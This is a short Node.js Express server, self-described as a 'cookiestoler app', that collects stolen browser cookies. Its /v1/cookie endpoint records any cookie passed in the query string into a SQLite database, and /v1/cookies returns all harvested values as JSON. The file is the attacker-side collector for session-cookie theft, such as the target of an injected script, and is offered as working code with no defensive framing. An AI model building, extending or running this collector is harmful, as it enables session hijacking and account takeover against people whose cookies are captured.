const express = require('express')
const fs = require('fs');
const sqlite3 = require('sqlite3').verbose();
const app = express()

const dbFile = 'cookies.db'
const exists = fs.existsSync(dbFile)
const db = new sqlite3.Database(dbFile)

db.serialize(function () {
    if(!exists) {
        db.run('CREATE TABLE cookies (cookie TEXT)')
    }
});

var router = express.Router();

router.route('/cookie').get(function (req, res) {
    if(req.query.cookie === undefined){
        res.status(400);
        res.send('bad parameters')
    }  
    else {
        
        const query = db.prepare("INSERT INTO cookies VALUES (?)")
        query.run(req.query.cookie)
        query.finalize(function () {
            res.status = 200
            res.send()
        });
    }   
});
router.route('/cookies').get(function (req, res){
    db.all("SELECT rowid AS id, cookie FROM cookies", function(err, rows) {
        res.send(JSON.stringify(rows))
    })
})
app.use('/v1', router);
app.get('/', function (req, res) {
    res.send('cookiestoler app') 
})

app.listen(3001, function () {
  console.log('listening on port 3001!')
})